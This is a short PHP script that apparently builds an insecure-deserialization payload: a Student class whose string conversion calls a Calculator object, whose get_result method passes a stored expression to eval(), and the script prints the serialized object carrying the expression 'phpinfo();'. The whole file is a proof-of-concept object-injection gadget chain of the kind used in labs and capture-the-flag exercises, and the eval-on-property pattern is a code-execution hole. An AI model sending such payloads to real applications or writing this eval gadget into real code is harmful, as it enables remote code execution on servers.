<?php

class Student
{

    public $name;
    public $age;
    public $exam;
    public function __construct($name, $age, $exam)
    {
        $this->name = $name;
        $this->age = $age;
        $this->exam = $exam;

    }

    public function __toString()
    {
        return "<td>{$this->name}</td><td>{$this->age}</td><td>{$this->get_point()}</td>";
    }


    public function get_point()
    {
        if (isset($this->exam))
            return $this->exam->get_result();
        return "N/A";
    }
}

class Calculator
{
    public $expression;
    public function __construct($expr)
    {
        $this->expression = $expr;
    }

    public function get_result()
    {
        $result = eval($this->expression);
        return $result;
    }
}

$calc = new Calculator("phpinfo();");
$stu = new Student("dat",21,$calc);

echo serialize($stu);
?>